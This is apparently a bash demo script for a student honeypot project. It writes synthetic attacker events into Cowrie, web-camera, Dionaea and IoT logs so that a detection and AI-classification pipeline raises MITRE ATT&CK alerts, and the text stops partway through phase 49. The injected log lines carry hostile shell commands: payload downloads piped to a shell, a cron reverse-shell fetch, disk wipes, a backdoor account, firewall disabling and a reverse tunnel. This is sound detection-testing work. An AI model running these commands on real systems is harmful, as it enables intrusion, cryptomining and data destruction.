#!/usr/bin/env bash
# ================================================================
#  HoneyManager — Full MITRE ATT&CK Demo  (50 phases)
#  Covers all 27+ techniques across 4 honeypots
#  Deep Gemini AI command classification showcase
# ================================================================

# ── Paths ──────────────────────────────────────────────────────
BASE="/home/hosafxd/Downloads/DÖNEM6/GRADUATION/HoneyManager (4)/HoneyManager"
LOGS="$BASE/data/logs"
BINS="$BASE/data/dionaea-binaries"
DB="$BASE/data/db/alerts.db"

WAIT=2     # seconds between phases
WAIT_BIN=35 # binary watcher polls every 30s

# ── Colors ─────────────────────────────────────────────────────
R='\033[0;31m'
O='\033[0;33m'
Y='\033[1;33m'
G='\033[0;32m'
C='\033[0;36m'
W='\033[1;37m'
DIM='\033[2m'
M='\033[0;35m'
RESET='\033[0m'

# ── Helpers ────────────────────────────────────────────────────
phase_banner() {
  local num="$1" total="$2" mitre="$3" name="$4" hp="$5" sev="$6"
  local sc
  case "$sev" in critical) sc="$R";; high) sc="$O";; medium) sc="$Y";; *) sc="$G";; esac
  echo ""
  echo -e "${W}╔══════════════════════════════════════════════════════════════╗${RESET}"
  echo -e "${W}║${RESET} ${C}PHASE ${num}/${total}${RESET}  ${sc}[${mitre}]${RESET}  ${W}${name}${RESET}"
  echo -e "${W}║${RESET} ${DIM}Honeypot: ${hp}   Severity: ${sc}${sev^^}${RESET}"
  echo -e "${W}╚══════════════════════════════════════════════════════════════╝${RESET}"
}

inject() {
  local file="$1" line="$2"
  printf '%s\n' "$line" >> "$file"
  echo -e "  ${G}▸${RESET} ${DIM}${line:0:110}${RESET}"
}

inject_raw() {
  local file="$1" line="$2"
  printf '%s\n' "$line" >> "$file"
  echo -e "  ${G}▸${RESET} ${DIM}${line:0:110}${RESET}"
}

countdown() {
  local secs="$1" label="${2:-Next phase}"
  for ((i=secs; i>0; i--)); do
    printf "\r  ${C}⏱  %s in %2ds ...${RESET}" "$label" "$i"
    sleep 1
  done
  printf "\r%70s\r" ""
}

alert_count() {
  sqlite3 "$DB" "SELECT COUNT(*) FROM alerts;" 2>/dev/null || echo "0"
}

last_alerts() {
  local n="${1:-3}"
  echo -e "  ${Y}── last ${n} DB alerts ─────────────────────────────────${RESET}"
  sqlite3 "$DB" \
    "SELECT '  [' || id || '] ' || printf('%-8s',severity) || ' ' || printf('%-14s',COALESCE(mitre_id,'n/a')) || ' ' || printf('%-28s',event_type) || ' ' || source_ip FROM alerts ORDER BY id DESC LIMIT ${n};" \
    2>/dev/null || true
  echo ""
}

ts() { date -u +%Y-%m-%dT%H:%M:%S.000000Z; }

# ── Preflight ──────────────────────────────────────────────────
clear
echo -e "${M}"
cat << 'BANNER'
  ██╗  ██╗ ██████╗ ███╗   ██╗███████╗██╗   ██╗
  ██║  ██║██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝
  ███████║██║   ██║██╔██╗ ██║█████╗   ╚████╔╝
  ██╔══██║██║   ██║██║╚██╗██║██╔══╝    ╚██╔╝
  ██║  ██║╚██████╔╝██║ ╚████║███████╗   ██║
  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝
BANNER
echo -e "${RESET}"
echo -e "${W}  Full MITRE ATT&CK Demo — 50 Phases, 27+ Techniques${RESET}"
echo -e "  ${DIM}4 honeypots │ Gemini AI classification │ Correlation engine${RESET}"
echo ""
echo -e "  ${Y}LOGS :${RESET} $LOGS"
echo -e "  ${Y}DB   :${RESET} $DB"
echo -e "  ${Y}WAIT :${RESET} ${WAIT}s per phase  (~$((50 * WAIT / 60)) min total)"
echo ""

mkdir -p "$LOGS/cowrie" "$LOGS/web-camera" "$LOGS/dionaea" "$LOGS/custom-iot"
mkdir -p "$BINS"
echo -e "  ${G}✓ Directories ready${RESET}"

if ! pgrep -f "watcher.py" > /dev/null 2>&1; then
  echo -e "  ${R}⚠  watcher.py not detected! Start it before running demo.${RESET}"
  echo -e "  ${Y}     cd '$BASE/backend' && python3 watcher.py${RESET}"
fi
echo -e "  ${G}✓ Alerts in DB: $(alert_count)${RESET}"
echo ""
echo -e "  ${W}Press ENTER to start the demo...${RESET}"
read -r

TOTAL=50

# ════════════════════════════════════════════════════════════════
#  SECTION 1 — COWRIE: STATIC LABEL EVENTS  (Phases 1–4)
# ════════════════════════════════════════════════════════════════

phase_banner 1 $TOTAL "T1021.004" "SSH Connection" "honey_cowrie" "low"
echo "  Source: 203.0.113.10 → probes Cowrie router on port 22"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.session.connect\",\"src_ip\":\"203.0.113.10\",\"dst_port\":22,\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 2 $TOTAL "T1592.004" "SSH Client Version Fingerprinting" "honey_cowrie" "low"
echo "  Source: 203.0.113.11 → libssh2 client reveals itself"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.client.version\",\"src_ip\":\"203.0.113.11\",\"version\":\"SSH-2.0-libssh2_1.10.0\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 3 $TOTAL "T1110.001" "Failed SSH Login — Brute Force" "honey_cowrie" "high"
echo "  Source: 45.33.32.156 → trying root:toor"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.login.failed\",\"src_ip\":\"45.33.32.156\",\"username\":\"root\",\"password\":\"toor\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 4 $TOTAL "T1078" "Successful SSH Login" "honey_cowrie" "critical"
echo "  Source: 91.108.4.1 → admin/admin — attacker now has shell!"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.login.success\",\"src_ip\":\"91.108.4.1\",\"username\":\"admin\",\"password\":\"admin\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

# ════════════════════════════════════════════════════════════════
#  SECTION 2 — GEMINI: 12 STANDARD COMMAND CLASSIFICATIONS (5–16)
# ════════════════════════════════════════════════════════════════

echo -e "\n${M}${W}  ═══ GEMINI AI COMMAND CLASSIFICATION — STANDARD CASES ═══${RESET}"
echo -e "  ${DIM}Each command goes to Gemini 2.5-flash-lite → MITRE ID → severity from _MITRE_SEVERITY dict${RESET}\n"

phase_banner 5 $TOTAL "T1082" "System Info Discovery" "honey_cowrie/cmd" "medium"
echo "  Source: 91.108.4.1 → 'uname -a'  (expected: T1082, medium)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"uname -a\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 6 $TOTAL "T1033" "User/Owner Discovery" "honey_cowrie/cmd" "medium"
echo "  Source: 91.108.4.1 → 'id; whoami; cat /etc/passwd'  (expected: T1033, medium)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"id; whoami; cat /etc/passwd\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 7 $TOTAL "T1057" "Process Discovery" "honey_cowrie/cmd" "medium"
echo "  Source: 91.108.4.1 → 'ps aux | grep root'  (expected: T1057, medium)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"ps aux | grep root\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 8 $TOTAL "T1083" "File and Directory Discovery" "honey_cowrie/cmd" "medium"
echo "  Source: 91.108.4.1 → hunting for keys/certs  (expected: T1083, medium)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"find / -name '*.pem' -o -name '*.key' 2>/dev/null\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 9 $TOTAL "T1105" "Ingress Tool Transfer" "honey_cowrie/cmd" "critical"
echo "  Source: 91.108.4.1 → wget malware payload  (expected: T1105, CRITICAL)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"wget http://185.220.101.45/xmrig -O /tmp/.x && chmod +x /tmp/.x\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 10 $TOTAL "T1489" "Service Stop" "honey_cowrie/cmd" "critical"
echo "  Source: 91.108.4.1 → kills firewall  (expected: T1489, CRITICAL)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"systemctl stop firewalld && systemctl disable firewalld\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 11 $TOTAL "T1070.003" "Clear Command History" "honey_cowrie/cmd" "high"
echo "  Source: 91.108.4.1 → erases tracks  (expected: T1070.003, high)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"history -c && unset HISTFILE && cat /dev/null > ~/.bash_history\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 12 $TOTAL "T1548.003" "Sudo Privilege Abuse" "honey_cowrie/cmd" "high"
echo "  Source: 91.108.4.1 → 'sudo su -'  (expected: T1548.003, high)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"sudo su -\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 13 $TOTAL "T1053.003" "Cron Persistence" "honey_cowrie/cmd" "high"
echo "  Source: 91.108.4.1 → installs reverse-shell cron job  (expected: T1053.003, high)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"echo '*/5 * * * * curl -s http://91.108.4.1/b|sh' | crontab -\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 14 $TOTAL "T1496" "Crypto Mining" "honey_cowrie/cmd" "critical"
echo "  Source: 185.220.101.45 → launches XMRig  (expected: T1496, CRITICAL)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"185.220.101.45\",\"input\":\"./xmrig -o pool.minexmr.com:4444 -u 4ATMwallet --donate-level 1 -t 4\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 15 $TOTAL "T1485" "Data Destruction — Wiper" "honey_cowrie/cmd" "critical"
echo "  Source: 77.247.181.162 → rm -rf / AND dd wipe  (expected: T1485, CRITICAL)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"77.247.181.162\",\"input\":\"rm -rf / --no-preserve-root && dd if=/dev/zero of=/dev/sda bs=1M\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 16 $TOTAL "T1059.004" "Unix Shell — Gemini Fallback" "honey_cowrie/cmd" "high"
echo "  Source: 198.51.100.7 → 'exec bash'  (Gemini fallback → T1059.004, high)"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"198.51.100.7\",\"input\":\"exec bash\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

# ════════════════════════════════════════════════════════════════
#  SECTION 3 — GEMINI UPPER LIMITS: EDGE CASE COMMANDS (17–26)
# ════════════════════════════════════════════════════════════════

echo -e "\n${M}${W}  ═══ GEMINI UPPER LIMITS — COMMANDS NOT IN _MITRE_SEVERITY DICT ═══${RESET}"
echo -e "  ${DIM}Gemini must produce novel IDs → all fall back to default 'high' severity${RESET}\n"

phase_banner 17 $TOTAL "T1003.008" "Credential Dumping: /etc/shadow" "honey_cowrie/cmd" "high"
echo "  Source: 91.108.4.1 → 'cat /etc/shadow'"
echo -e "  ${DIM}Expected: T1003.008 — not in dict → severity defaults to high${RESET}"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"cat /etc/shadow\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 18 $TOTAL "T1049" "System Network Connections Discovery" "honey_cowrie/cmd" "high"
echo "  Source: 91.108.4.1 → 'netstat -anp | grep LISTEN'"
echo -e "  ${DIM}Expected: T1049 — maps listening services${RESET}"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"netstat -anp | grep LISTEN\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 19 $TOTAL "T1018" "Remote System Discovery via ARP" "honey_cowrie/cmd" "high"
echo "  Source: 91.108.4.1 → 'arp -a && cat /proc/net/arp'"
echo -e "  ${DIM}Expected: T1018 — finds other hosts on subnet${RESET}"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"arp -a && cat /proc/net/arp\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 20 $TOTAL "T1040" "Network Traffic Capture" "honey_cowrie/cmd" "high"
echo "  Source: 91.108.4.1 → tcpdump to capture creds in transit"
echo -e "  ${DIM}Expected: T1040 — network sniffing${RESET}"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"tcpdump -i eth0 -w /tmp/.cap.pcap -c 5000 &\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 21 $TOTAL "T1136.001" "Create Backdoor Account" "honey_cowrie/cmd" "high"
echo "  Source: 91.108.4.1 → adds 'backdoor' user with sudo"
echo -e "  ${DIM}Expected: T1136 or T1136.001 — Create Account: Local${RESET}"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"useradd -m -s /bin/bash -G sudo backdoor && echo 'backdoor:P@ss!' | chpasswd\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 22 $TOTAL "T1548.001" "Setuid Bit on /bin/bash" "honey_cowrie/cmd" "high"
echo "  Source: 91.108.4.1 → chmod +s /bin/bash for persistent privesc"
echo -e "  ${DIM}Expected: T1548.001 — Setuid/Setgid${RESET}"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"chmod +s /bin/bash && ls -la /bin/bash\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 23 $TOTAL "T1562.004" "Flush iptables / Disable Firewall" "honey_cowrie/cmd" "high"
echo "  Source: 91.108.4.1 → iptables -F, sets default ACCEPT policies"
echo -e "  ${DIM}Expected: T1562.004 — Impair Defenses: Disable Firewall${RESET}"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"91.108.4.1\",\"input\":\"iptables -F && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 24 $TOTAL "T1059.006" "Python PTY Shell Upgrade" "honey_cowrie/cmd" "high"
echo "  Source: 134.209.24.15 → upgrades to interactive PTY via Python"
echo -e "  ${DIM}Expected: T1059.006 — Python scripting interpreter${RESET}"
LINE="{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"134.209.24.15\",\"input\":\"python3 -c \\\"import pty; pty.spawn('/bin/bash')\\\"\",\"timestamp\":\"$(ts)\"}"
inject "$LOGS/cowrie/cowrie.json" "$LINE"
last_alerts 1; countdown $WAIT

phase_banner 25 $TOTAL "T1027" "Base64 Obfuscated Payload" "honey_cowrie/cmd" "high"
echo "  Source: 134.209.24.15 → decodes and pipes base64 payload to bash"
echo -e "  ${DIM}Expected: T1027 — Obfuscated Files or Information${RESET}"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"134.209.24.15\",\"input\":\"echo d2dldCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2g= | base64 -d | bash\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

phase_banner 26 $TOTAL "T1572" "Reverse SSH Tunnel — C2 Channel" "honey_cowrie/cmd" "high"
echo "  Source: 134.209.24.15 → encrypted reverse tunnel for command-and-control"
echo -e "  ${DIM}Expected: T1572 Protocol Tunneling (or T1021.004)${RESET}"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"134.209.24.15\",\"input\":\"ssh -fNR 4444:localhost:22 attacker@91.108.4.1 -o StrictHostKeyChecking=no\",\"timestamp\":\"$(ts)\"}"
last_alerts 1; countdown $WAIT

# ════════════════════════════════════════════════════════════════
#  SECTION 4 — WEB-CAMERA HONEYPOT  (Phases 27–36)
# ════════════════════════════════════════════════════════════════

echo -e "\n${M}${W}  ═══ WEB-CAMERA HONEYPOT (Hikvision Clone) ═══${RESET}\n"

phase_banner 27 $TOTAL "T1190" "Generic HTTP Access — Baseline" "honey_web-camera" "low"
echo "  Source: 192.0.2.55 → plain browser GET, low-severity baseline"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"192.0.2.55\",\"request_uri\":\"/index.html\",\"request_method\":\"GET\",\"status\":\"200\",\"http_user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"}"
last_alerts 1; countdown $WAIT

phase_banner 28 $TOTAL "T1595.002" "Nikto Vulnerability Scanner" "honey_web-camera" "high"
echo "  Source: 45.79.183.10 → nikto User-Agent detected in access.json"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"45.79.183.10\",\"request_uri\":\"/\",\"request_method\":\"GET\",\"status\":\"200\",\"http_user_agent\":\"Mozilla/5.0 (Nikto/2.1.6) (Evasions:None) (Test:000398)\"}"
last_alerts 1; countdown $WAIT

phase_banner 29 $TOTAL "T1595.002" "Masscan Rapid Port Scanner" "honey_web-camera" "high"
echo "  Source: 194.165.16.4 → masscan sweeping entire subnet"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"194.165.16.4\",\"request_uri\":\"/\",\"request_method\":\"GET\",\"status\":\"200\",\"http_user_agent\":\"masscan/1.3 (https://github.com/robertdavidgraham/masscan)\"}"
last_alerts 1; countdown $WAIT

phase_banner 30 $TOTAL "T1595.002" "SQLmap SQL Injection Scanner" "honey_web-camera" "high"
echo "  Source: 89.248.167.13 → automated SQLi probing login endpoint"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"89.248.167.13\",\"request_uri\":\"/login?id=1'\",\"request_method\":\"GET\",\"status\":\"200\",\"http_user_agent\":\"sqlmap/1.7.2#stable (https://sqlmap.org)\"}"
last_alerts 1; countdown $WAIT

phase_banner 31 $TOTAL "T1595.002" "Nuclei CVE Template Scanner" "honey_web-camera" "high"
echo "  Source: 167.94.145.58 → nuclei scanning for CVE templates"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"167.94.145.58\",\"request_uri\":\"/cgi-bin/test.cgi\",\"request_method\":\"GET\",\"status\":\"404\",\"http_user_agent\":\"nuclei - Open-source Project (github.com/projectdiscovery/nuclei)\"}"
last_alerts 1; countdown $WAIT

phase_banner 32 $TOTAL "T1110.003" "Web Login Brute Force" "honey_web-camera" "high"
echo "  Source: 62.210.103.232 → POST /login credential stuffing"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"62.210.103.232\",\"request_uri\":\"/login\",\"request_method\":\"POST\",\"status\":\"401\",\"http_user_agent\":\"python-requests/2.31.0\"}"
last_alerts 1; countdown $WAIT

phase_banner 33 $TOTAL "T1552.001" "Credentials In Files — .env Probe" "honey_web-camera" "high"
echo "  Source: 185.156.73.50 → fetching .env and .git/config"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"185.156.73.50\",\"request_uri\":\"/.env\",\"request_method\":\"GET\",\"status\":\"200\",\"http_user_agent\":\"Mozilla/5.0\"}"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"185.156.73.50\",\"request_uri\":\"/.git/config\",\"request_method\":\"GET\",\"status\":\"200\",\"http_user_agent\":\"Mozilla/5.0\"}"
last_alerts 2; countdown $WAIT

phase_banner 34 $TOTAL "T1595.003" "Admin Panel Wordlist Scan" "honey_web-camera" "medium"
echo "  Source: 5.188.86.172 → probing /wp-admin, /phpmyadmin, /admin"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"5.188.86.172\",\"request_uri\":\"/wp-admin\",\"request_method\":\"GET\",\"status\":\"404\",\"http_user_agent\":\"Mozilla/5.0\"}"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"5.188.86.172\",\"request_uri\":\"/phpmyadmin\",\"request_method\":\"GET\",\"status\":\"404\",\"http_user_agent\":\"Mozilla/5.0\"}"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"5.188.86.172\",\"request_uri\":\"/admin\",\"request_method\":\"GET\",\"status\":\"404\",\"http_user_agent\":\"Mozilla/5.0\"}"
last_alerts 3; countdown $WAIT

phase_banner 35 $TOTAL "T1083" "robots.txt Reconnaissance" "honey_web-camera" "low"
echo "  Source: 23.129.64.101 → reads robots.txt to enumerate disallowed paths"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"23.129.64.101\",\"request_uri\":\"/robots.txt\",\"request_method\":\"GET\",\"status\":\"200\",\"http_user_agent\":\"Mozilla/5.0\"}"
last_alerts 1; countdown $WAIT

phase_banner 36 $TOTAL "T1056.003" "Web Portal Credential Capture" "honey_web-camera" "critical"
echo "  Source: 193.32.162.14 & 109.70.100.27 → login credentials captured by honeypot"
inject "$LOGS/web-camera/credentials.json" \
  "{\"source_ip\":\"193.32.162.14\",\"username\":\"admin\",\"password\":\"Hikvision2024!\"}"
inject "$LOGS/web-camera/credentials.json" \
  "{\"source_ip\":\"109.70.100.27\",\"username\":\"root\",\"password\":\"camera123\"}"
last_alerts 2; countdown $WAIT

# ════════════════════════════════════════════════════════════════
#  SECTION 5 — DIONAEA HONEYPOT  (Phases 37–39)
# ════════════════════════════════════════════════════════════════

echo -e "\n${M}${W}  ═══ DIONAEA HONEYPOT (NAS Clone — SMB/FTP) ═══${RESET}\n"

phase_banner 37 $TOTAL "T1210" "SMB EternalBlue Exploit — Port 445" "honey_dionaea" "high"
echo "  Source: 46.101.141.232 → probing port 445 (SMB / EternalBlue / WannaCry)"
inject "$LOGS/dionaea/dionaea.log" \
  "{\"remote\":{\"host\":\"46.101.141.232\",\"port\":49152},\"local\":{\"port\":445}}"
last_alerts 1; countdown $WAIT

phase_banner 38 $TOTAL "T1048.003" "FTP Exfiltration Channel — Port 21" "honey_dionaea" "medium"
echo "  Source: 192.241.214.25 → FTP connection attempt on port 21"
inject "$LOGS/dionaea/dionaea.log" \
  "{\"remote\":{\"host\":\"192.241.214.25\",\"port\":52000},\"local\":{\"port\":21}}"
last_alerts 1; countdown $WAIT

phase_banner 39 $TOTAL "T1190" "MySQL Remote Access — Port 3306" "honey_dionaea" "medium"
echo "  Source: 95.214.53.103 → probing MySQL on port 3306"
inject "$LOGS/dionaea/dionaea.log" \
  "{\"remote\":{\"host\":\"95.214.53.103\",\"port\":58000},\"local\":{\"port\":3306}}"
last_alerts 1; countdown $WAIT

# ════════════════════════════════════════════════════════════════
#  SECTION 6 — CUSTOM-IoT: SSH via syslog  (Phases 40–41)
# ════════════════════════════════════════════════════════════════

echo -e "\n${M}${W}  ═══ CUSTOM-IoT HONEYPOT — SSH (syslog) ═══${RESET}\n"

phase_banner 40 $TOTAL "T1110.001" "Failed SSH Login on IoT Device" "honey_custom-iot" "high"
echo "  Source: 162.243.183.202 → invalid user 'admin' on IoT device"
inject_raw "$LOGS/custom-iot/auth.log" \
  "$(date '+%b %e %H:%M:%S') iot-device sshd[1234]: Failed password for invalid user admin from 162.243.183.202 port 22 ssh2"
last_alerts 1; countdown $WAIT

phase_banner 41 $TOTAL "T1133" "Successful SSH Login on IoT Device" "honey_custom-iot" "critical"
echo "  Source: 101.200.98.112 → root account compromised on IoT device!"
inject_raw "$LOGS/custom-iot/auth.log" \
  "$(date '+%b %e %H:%M:%S') iot-device sshd[1235]: Accepted password for root from 101.200.98.112 port 22 ssh2"
last_alerts 1; countdown $WAIT

# ════════════════════════════════════════════════════════════════
#  SECTION 7 — CUSTOM-IoT: FTP via vsftpd  (Phases 42–44)
# ════════════════════════════════════════════════════════════════

echo -e "\n${M}${W}  ═══ CUSTOM-IoT HONEYPOT — FTP (vsftpd) ═══${RESET}\n"

phase_banner 42 $TOTAL "T1071.002" "FTP Connection Established" "honey_custom-iot" "high"
echo "  Source: 116.31.116.10 → FTP client connected to IoT honeypot"
inject_raw "$LOGS/custom-iot/vsftpd.log" \
  "$(date '+%a %b %e %H:%M:%S %Y') [pid 1000] CONNECT: Client \"116.31.116.10\""
last_alerts 1; countdown $WAIT

phase_banner 43 $TOTAL "T1110.001" "FTP Failed Login" "honey_custom-iot" "high"
echo "  Source: 116.31.116.10 → wrong FTP credentials"
inject_raw "$LOGS/custom-iot/vsftpd.log" \
  "$(date '+%a %b %e %H:%M:%S %Y') [pid 1001] [ftp] FAIL LOGIN: Client \"116.31.116.10\""
last_alerts 1; countdown $WAIT

phase_banner 44 $TOTAL "T1078.003" "FTP Successful Login" "honey_custom-iot" "critical"
echo "  Source: 175.45.176.20 → FTP account compromised!"
inject_raw "$LOGS/custom-iot/vsftpd.log" \
  "$(date '+%a %b %e %H:%M:%S %Y') [pid 1002] [ftp] OK LOGIN: Client \"175.45.176.20\", \"ftpuser\""
last_alerts 1; countdown $WAIT

# ════════════════════════════════════════════════════════════════
#  SECTION 8 — CORRELATION ENGINE: PATTERN DETECTION (45–49)
# ════════════════════════════════════════════════════════════════

echo -e "\n${M}${W}  ═══ CORRELATION ENGINE — PATTERN DETECTION ═══${RESET}"
echo -e "  ${DIM}Events injected in rapid burst → watcher accumulates in ip_events → pattern fires${RESET}\n"

phase_banner 45 $TOTAL "T1110" "Brute Force Detected (5+ same-user)" "system/detector" "high"
echo "  Source: 10.9.9.10 → 6 failed logins, all username='root'"
for i in $(seq 1 6); do
  inject "$LOGS/cowrie/cowrie.json" \
    "{\"eventid\":\"cowrie.login.failed\",\"src_ip\":\"10.9.9.10\",\"username\":\"root\",\"password\":\"attempt${i}\",\"timestamp\":\"$(ts)\"}"
done
echo -e "  ${Y}▸ 6 events queued. Watcher detects on next cycle (~2s) and fires system alert.${RESET}"
last_alerts 3; countdown $WAIT

phase_banner 46 $TOTAL "T1110.003" "Password Spraying (6 usernames)" "system/detector" "high"
echo "  Source: 10.9.9.11 → same password tried against 6 different accounts"
for user in root admin administrator operator backup guest; do
  inject "$LOGS/cowrie/cowrie.json" \
    "{\"eventid\":\"cowrie.login.failed\",\"src_ip\":\"10.9.9.11\",\"username\":\"${user}\",\"password\":\"Summer2024!\",\"timestamp\":\"$(ts)\"}"
done
echo -e "  ${Y}▸ 6 unique usernames detected → spraying alert (T1110.003) fires.${RESET}"
last_alerts 3; countdown $WAIT

phase_banner 47 $TOTAL "T1046" "Port Scan Detected (12 connections)" "system/detector" "medium"
echo "  Source: 10.9.9.12 → 12 rapid SSH connections to different ports"
for i in $(seq 1 12); do
  inject "$LOGS/cowrie/cowrie.json" \
    "{\"eventid\":\"cowrie.session.connect\",\"src_ip\":\"10.9.9.12\",\"dst_port\":$((20+i)),\"timestamp\":\"$(ts)\"}"
done
echo -e "  ${Y}▸ 12 connection events → port scan alert (T1046) fires.${RESET}"
last_alerts 2; countdown $WAIT

phase_banner 48 $TOTAL "T1595.001" "Cross-Honeypot Reconnaissance (4 nodes)" "system/detector" "high"
echo "  Source: 10.9.9.13 → same IP touches ALL 4 honeypots in sequence"
echo "  [1/4] cowrie → SSH probe"
inject "$LOGS/cowrie/cowrie.json" \
  "{\"eventid\":\"cowrie.session.connect\",\"src_ip\":\"10.9.9.13\",\"dst_port\":22,\"timestamp\":\"$(ts)\"}"
echo "  [2/4] web-camera → HTTP probe"
inject "$LOGS/web-camera/access.json" \
  "{\"remote_addr\":\"10.9.9.13\",\"request_uri\":\"/\",\"request_method\":\"GET\",\"status\":\"200\",\"http_user_agent\":\"Mozilla/5.0\"}"
echo "  [3/4] dionaea → SMB probe"
inject "$LOGS/dionaea/dionaea.log" \
  "{\"remote\":{\"host\":\"10.9.9.13\",\"port\":49300},\"local\":{\"port\":445}}"
echo "  [4/4] custom-iot → SSH probe"
inject_raw "$LOGS/custom-iot/auth.log" \
  "$(date '+%b %e %H:%M:%S') iot-device sshd[9001]: Failed password for invalid user pi from 10.9.9.13 port 22 ssh2"
echo -e "  ${Y}▸ IP hit 4 honeypots → lateral recon alert (T1595.001) fires.${RESET}"
last_alerts 3; countdown $WAIT

phase_banner 49 $TOTAL "T1499" "Connection Flood / Endpoint DoS (105 events)" "system/detector" "high"
echo "  Source: 10.9.9.14 → 105 connection events in single burst"
python3 -c "
line = '{\"eventid\":\"cowrie.session.connect\",\"src_ip\":\"10.9.9.14\",\"dst_port\":22,\"timestamp\":\"2026-05-11T12:00:00.000000Z\"}\n'
with open('$LOGS/cowrie/cowrie.json', 'a') as f:
